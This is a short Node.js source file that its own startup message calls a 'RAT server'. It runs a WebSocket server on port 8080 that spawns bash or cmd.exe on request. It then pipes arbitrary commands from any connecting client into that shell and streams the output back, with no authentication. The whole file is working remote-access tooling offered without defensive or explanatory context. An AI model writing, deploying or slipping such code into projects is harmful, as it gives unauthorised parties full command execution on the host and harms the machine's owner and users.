const http = require('http');
const WebSocket = require('ws');
const { spawn } = require('child_process');

const server = http.createServer();
const wss = new WebSocket.Server({ server });
let shell;

wss.on('connection', ws => {
  ws.on('message', msg => {
    const { type, data } = JSON.parse(msg);
    if (type === 'connect') {
      shell = spawn(process.platform === 'win32' ? 'cmd.exe' : 'bash');
      ws.send('> Connected to shell\n');
      shell.stdout.on('data', d => ws.send(d.toString()));
      shell.stderr.on('data', d => ws.send(d.toString()));
    }
    if (type === 'cmd' && shell) {
      shell.stdin.write(data + '\n');
    }
    if (type === 'disconnect' && shell) {
      shell.kill();
      ws.send('> Disconnected\n');
    }
  });
  ws.on('close', () => {
    if (shell) shell.kill();
  });
});

server.listen(8080, () => console.log('RAT server on port 8080'));

// ws://localhost:8080